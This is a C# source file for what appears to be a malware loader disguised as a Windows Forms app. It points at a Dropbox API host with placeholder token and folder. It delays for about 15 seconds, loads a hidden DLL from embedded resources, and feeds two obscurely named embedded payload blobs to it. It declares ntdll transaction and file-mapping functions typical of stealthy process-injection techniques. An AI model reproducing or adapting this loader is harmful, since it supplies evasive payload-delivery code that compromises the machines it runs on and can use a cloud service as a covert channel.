using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using ClassLibrary1;

namespace WindowsFormsApp1;

internal static class Program
{
	[DllImport("ntdll.dll")]
	public static extern bool RtlSetCurrentTransaction(IntPtr TransactionHandle);

	[DllImport("ntdll.dll")]
	public static extern int NtRollbackTransaction(IntPtr TransactionHandle, bool Wait);

	[DllImport("kernel32.dll")]
	public static extern int GetFileSize(IntPtr FileHandle, IntPtr Test);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr CreateFileMapping(IntPtr hFile, int lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

	[DllImport("kernel32.dll", SetLastError = true)]
	internal static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, int dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

	[STAThread]
	private static void Main(string[] args)
	{
		AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
		args = new string[3] { "content.dropboxapi.com", "<FOLDER>", "<DROPBOX TOKEN>" };
		Execute(args);
	}

	private static byte[] GetEmbeddedResourceContent(string resourceName)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string name = executingAssembly.GetManifestResourceNames().SingleOrDefault((string r) => r.Contains(resourceName)) ?? "";
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
		byte[] array = new byte[manifestResourceStream.Length];
		manifestResourceStream.Read(array, 0, array.Length);
		return array;
	}

	private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
	{
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(typeof(CustomLoadLibrary).Namespace + ".ClassLibrary1.dll");
		MemoryStream memoryStream = new MemoryStream();
		stream.CopyTo(memoryStream);
		return Assembly.Load(memoryStream.ToArray());
	}

	public static void Execute(string[] args)
	{
		for (int i = 0; i < 15; i++)
		{
			Thread.Sleep(999);
		}
		dynamic val = Activator.CreateInstance(typeof(ClassLibrary1));
		object embeddedResourceContent = GetEmbeddedResourceContent("Kcfvujvwrsz");
		object embeddedResourceContent2 = GetEmbeddedResourceContent("Ohnuqmpv");
		val.ClassLibrary(embeddedResourceContent, embeddedResourceContent2, "ResolveStruct");
		if (IntPtr.Size == 8)
		{
			Console.WriteLine("[*] Done! ");
		}
	}
}
